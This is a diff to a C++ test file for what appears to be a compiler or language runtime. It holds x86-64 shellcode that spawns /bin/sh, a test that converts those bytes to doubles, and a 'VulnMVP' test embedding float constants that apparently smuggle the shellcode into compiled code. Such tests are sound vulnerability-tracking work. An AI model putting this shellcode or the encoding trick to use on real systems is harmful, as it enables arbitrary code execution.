@@ -482,8 +482,10 @@ fun main() {
 )", 21);
 }
 
-static char shellcode[] = "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50"
-                          "\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05";
+static char shellcode[] = "\x48\x31\xd2\x52\x48\xb8\x2f\x62"
+                          "\x69\x6e\x2f\x2f\x73\x68\x50\x48"
+                          "\x89\xe7\x52\x57\x48\x89\xe6\x48"
+                          "\x31\xc0\xb0\x3b\x0f\x05\x90";
 
 TEST(Vuln, DISABLED_CheckShell) {
     typedef void (*vptr)();
@@ -510,4 +512,37 @@ TEST(Vuln, DISABLED_CheckShell) {
     l();
 
     munmap(region, pageSize);
+}
+
+TEST(Vuln, DoublesFromHexParsedCorrectly) {
+    ASSERT_TRUE(sizeof(shellcode) % sizeof(double) == 0);
+
+    union {
+        char bytes[sizeof(shellcode)];
+        double values[sizeof(bytes) / sizeof(double)];
+    };
+
+    std::strcpy(bytes, shellcode);
+
+    for (std::size_t i = 0; i < sizeof(values) / sizeof(double); ++i) {
+        std::stringstream ss;
+        ss << std::setprecision(30) << values[i];
+        double v = std::stod(ss.str());
+        std::cout << ss.str() << std::endl;
+
+        for (std::size_t j = 0; j < sizeof(double); ++j) {
+            ASSERT_EQ(bytes[i * sizeof(double) + j], *(reinterpret_cast<char*>(&v) + j));
+        }
+    }
+}
+
+TEST(Vuln, VulnMVP) {
+    assertProgramResult(R"(
+fun main() {
+    a = 9.13311275417349147128740860176e+164;
+    b = 2.23334226138660938778544477852e+40;
+    c = 1.57054810607513511574371074205e+43;
+    d = 5.70322518485311116492001613112e-306;
+}
+)", 0.0);
 }
